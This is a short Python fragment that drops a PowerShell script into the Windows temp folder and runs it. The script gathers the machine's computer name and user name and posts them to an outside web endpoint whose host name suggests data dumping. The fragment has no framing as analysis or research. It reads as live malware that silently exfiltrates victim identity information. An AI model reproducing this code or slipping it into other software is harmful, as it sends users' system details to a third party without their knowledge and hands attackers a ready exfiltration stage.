
if not os.path.exists(f"{os.path.expandvars('%TEMP%')}\\sc01.ps1"):
    scrpt = """
    $nomePC = $env:COMPUTERNAME
    $nomeUsuario = $env:USERNAME

    $jsonData = @{
        PC = $nomePC
        Usuario = $nomeUsuario
    } | ConvertTo-Json

    $url = "https://infodumperio.pythonanywhere.com/receber-solicitacao"

    $response = Invoke-RestMethod -Uri $url -Method Post -Body $jsonData -ContentType "application/json"

    $response
    """


    with open(f"{os.path.expandvars('%TEMP%')}\\sc01.ps1", 'w') as file:
        file.write(scrpt)

    subprocess.Popen(f"powershell {os.path.expandvars('%TEMP%')}\\sc01.ps1", shell=True)
